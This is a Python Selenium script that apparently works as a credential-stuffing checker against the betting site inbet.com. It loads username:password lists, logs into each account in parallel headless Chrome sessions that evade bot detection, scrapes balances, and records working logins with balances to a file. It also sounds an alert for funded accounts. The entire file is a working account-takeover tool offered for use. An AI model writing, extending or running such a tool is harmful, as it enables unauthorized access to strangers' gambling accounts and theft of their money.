import winsound  # For playing sound on Windows
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import keyboard  # for detecting keypresses
from colorama import Fore, Style, init
import sys
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from datetime import datetime
import multiprocessing

wrongpass_file = r"C:\Inbet\wrongpass.txt"

init(autoreset=True)

stop_flag = False
HEADLESS_MODE = True  # will be set from user input in main()

def log(message, level="INFO", username=None, password=None):
    color = {
        "INFO": Fore.CYAN,
        "WARNING": Fore.YELLOW,
        "ERROR": Fore.RED,
        "SUCCESS": Fore.GREEN
    }.get(level, Fore.CYAN)

    prefix = f"[{username}:{password}] " if username and password else ""
    print(f"{color}{prefix}[{level}] {message}{Style.RESET_ALL}")

def emergency_stop_listener():
    global stop_flag
    buffer = []

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 'i':
            buffer.append(time.time())
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                log("EMERGENCY STOP triggered! Exiting script.", "ERROR")
                stop_flag = True
                os._exit(0)

def sanitize_filename(text):
    return re.sub(r'[\\/:*?"<>|]', '_', text)

def safe_click(driver, element, username, password, retries=3):
    for attempt in range(1, retries + 1):
        try:
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.5)

            try:
                element.click()
            except Exception as click_err:
                log(f"Normal click failed on attempt {attempt}: {click_err}. Trying JS click...", "WARNING", username, password)
                driver.execute_script("arguments[0].click();", element)

            log(f"Click succeeded on attempt {attempt}.", "SUCCESS", username, password)
            return True
        except Exception as e:
            if attempt == retries:
                log(f"Click failed after {retries} attempts: {e}", "ERROR", username, password)
            else:
                log(f"Click intercepted on attempt {attempt}. Retrying...", "WARNING", username, password)
                try:
                    driver.execute_script("""
                        document.querySelectorAll(
                            '.modal, .modal-backdrop, .fade.show, .d-flex, .wh-100'
                        ).forEach(el => el.remove());
                    """)
                    log("Removed potential overlays.", "INFO", username, password)
                except Exception:
                    pass
                time.sleep(1)
    log("Could not click element after retries.", "ERROR", username, password)
    return False

def read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    # uses global HEADLESS_MODE
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")

    if HEADLESS_MODE:
        options.add_argument("--headless=new")

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 143
    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)
    return driver

def login(credentials):
    username, password = credentials
    driver = init_driver()

    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 30)

        # Accept cookies
        try:
            xpath_btn = '/html/body/div[1]/div/div[4]/div[1]/div/div[2]/button[1]'
            accept_cookies_btn = wait.until(
                EC.presence_of_element_located((By.XPATH, xpath_btn))
            )
            try:
                wait.until(EC.element_to_be_clickable((By.XPATH, xpath_btn))).click()
            except Exception:
                driver.execute_script("arguments[0].click();", accept_cookies_btn)
            log("Cookies accepted.", "INFO", username, password)
        except Exception:
            try:
                css_qid = '[data-qid="accept-cookies"]'
                accept_cookies_btn = wait.until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, css_qid))
                )
                try:
                    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, css_qid))).click()
                except Exception:
                    driver.execute_script("arguments[0].click();", accept_cookies_btn)
                log("Cookies accepted (fallback).", "INFO", username, password)
            except Exception:
                log("Accept Cookies button not found. Continuing...", "WARNING", username, password)

        # Open login window
        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div[2]/button[2]"))
            )
            driver.execute_script("arguments[0].click();", login_button)
        except Exception:
            log("Login button not found or not clickable.", "ERROR", username, password)
            return

        # Enter username
        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/div/form/div[1]/div/div/div/input")
                )
            )
            username_field.send_keys(username)
            log("Username entered.", "INFO", username, password)
        except Exception:
            log("Username field not found.", "ERROR", username, password)
            return

        # Enter password
        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/div/form/div[2]/div/div/div/input")
                )
            )
            password_field.send_keys(password)
            log("Password entered.", "INFO", username, password)
        except Exception:
            log("Password field not found.", "ERROR", username, password)
            return

        # Click login
        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/div/form/button")
                )
            )
            submit_button.click()
            log("Login button clicked.", "INFO", username, password)
        except Exception:
            log("Submit button not clickable.", "ERROR", username, password)
            return

        formatted_amount = '0.00'
        balance_found = False

        # Extract Balance
        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')
                try:
                    amount = float(amount_str)
                    formatted_amount = f"{amount:.2f}"
                    balance_found = True
                    log(f"Balance found: {formatted_amount}", "SUCCESS", username, password)
                except ValueError:
                    log("Failed to parse balance as float.", "WARNING", username, password)
            else:
                log("Balance text present but no numeric amount found.", "WARNING", username, password)
        except Exception:
            log("Balance element NOT found. Skipping further actions.", "ERROR", username, password)

            # Save to wrongpass.txt
            wrongpass_file = r"C:\Inbet\wrongpass.txt"
            os.makedirs(os.path.dirname(wrongpass_file), exist_ok=True)
            with open(wrongpass_file, "a", encoding="utf-8") as f:
                f.write(f"{username}:{password}\n")

            driver.quit()
            return

        # Close popup if present
        try:
            close_btn = wait.until(
                EC.element_to_be_clickable((By.XPATH, '//div[@data-qid="gmf-modal-close"]'))
            )
            close_btn.click()
            log("Popup closed.", "INFO", username, password)
            time.sleep(1)
            try:
                driver.execute_script("""
                    const backdrops = document.querySelectorAll('.modal-backdrop');
                    backdrops.forEach(el => el.remove());
                """)
                log("Removed modal backdrop via JavaScript.", "INFO", username, password)
            except Exception as e:
                log(f"Failed to remove modal backdrop: {e}", "WARNING", username, password)
            time.sleep(1)
        except Exception:
            pass

        # ===== CLICK OFFERS BUTTON (JS CLICK) & TAKE SCREENSHOT =====
        try:
            offers_btn = None

            # First try XPath
            try:
                offers_xpath = "/html/body/div[2]/div[2]/div/nav/div/div/div[3]/button"
                offers_btn = wait.until(
                    EC.element_to_be_clickable((By.XPATH, offers_xpath))
                )
                log("Offers button found by XPath.", "INFO", username, password)
            except Exception:
                # Fallback: CSS selector with aria-label="Оферти"
                try:
                    offers_css = 'button._3bnZK.pMqZV[aria-label="Оферти"]'
                    offers_btn = wait.until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, offers_css))
                    )
                    log("Offers button found by CSS selector.", "INFO", username, password)
                except Exception as e:
                    log(f"Offers button not found by XPath or CSS: {e}", "ERROR", username, password)

            if offers_btn:
                try:
                    # Scroll into view (optional but recommended)
                    driver.execute_script(
                        "arguments[0].scrollIntoView({block: 'center', inline: 'center'});",
                        offers_btn,
                    )

                    # JS click (javaclick)
                    driver.execute_script("arguments[0].click();", offers_btn)
                    log("Offers button clicked via JavaScript.", "SUCCESS", username, password)

                    # Give time for the offers modal/page to load
                    time.sleep(3)

                    # Try to remove any dark modal backdrop that may cover the page
                    try:
                        driver.execute_script("""
                            const backdrops = document.querySelectorAll('.modal-backdrop');
                            backdrops.forEach(el => el.remove());
                        """)
                        log("Removed modal backdrop after clicking offers button.", "INFO", username, password)
                    except Exception as e:
                        log(f"Failed to remove modal backdrop after offers click: {e}", "WARNING", username, password)

                    # Take screenshot after JS click
                    safe_name_offers = sanitize_filename(f"{username}_offers.png")
                    if driver.session_id is not None:
                        driver.save_screenshot(safe_name_offers)
                        log(f"Screenshot after offers click saved as {safe_name_offers}", "SUCCESS", username, password)
                    else:
                        log("Cannot save screenshot: session closed.", "ERROR", username, password)

                except Exception as e:
                    log(f"Failed to click Offers button via JavaScript and take screenshot: {e}", "ERROR", username, password)

        except Exception as e:
            log(f"Unexpected error in Offers button section: {e}", "ERROR", username, password)
        # =================================================

        # Sound if balance high
        balance_value = float(formatted_amount.replace(',', '.'))
        if balance_value > 0.99:
            try:
                winsound.PlaySound(
                    r"C:\Inbet\inbet.wav",
                    winsound.SND_FILENAME | winsound.SND_ASYNC
                )
                log("Sound played for high balance.", "SUCCESS", username, password)
            except:
                log("Could not play sound.", "WARNING", username, password)

        if balance_found:
            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"{username}:{password} - Balance: {formatted_amount}\n")

    except Exception as e:
        log(f"Unexpected error: {e}", "ERROR", username, password)
        traceback.print_exc()
    finally:
        driver.quit()

def main():
    global login_page_url, success_logins_file, stop_flag, HEADLESS_MODE

    credentials_file = 'uniquecredentials.txt'
    success_logins_file = r"C:\Inbet\balance.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://inbet.com/sports"
    credentials = read_credentials(credentials_file)

    if not credentials:
        log("No credentials found in file. Exiting.", "ERROR")
        return

    # ========= ASK HEADLESS OR NOT =========
    headless_input = input("Run browser in headless mode? (y/n, default: y): ").strip().lower()
    if headless_input == "n":
        HEADLESS_MODE = False
        log("Headless mode disabled. Browser windows will be visible.", "INFO")
    else:
        HEADLESS_MODE = True
        log("Headless mode enabled.", "INFO")

    # ========= ASK HOW MANY WORKERS =========
    cpu_count = multiprocessing.cpu_count()
    default_workers = min(9, cpu_count, len(credentials))
    workers_input = input(
        f"How many workers? (1-{len(credentials)}, default: {default_workers}): "
    ).strip()

    if workers_input.isdigit():
        max_workers = int(workers_input)
        if max_workers < 1:
            max_workers = 1
        if max_workers > len(credentials):
            max_workers = len(credentials)
    else:
        max_workers = default_workers

    log(f"Using {max_workers} workers (CPU cores: {cpu_count}).", "INFO")

    listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
    listener_thread.start()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(lambda cred: login(cred), credentials)

if __name__ == "__main__":
    main()
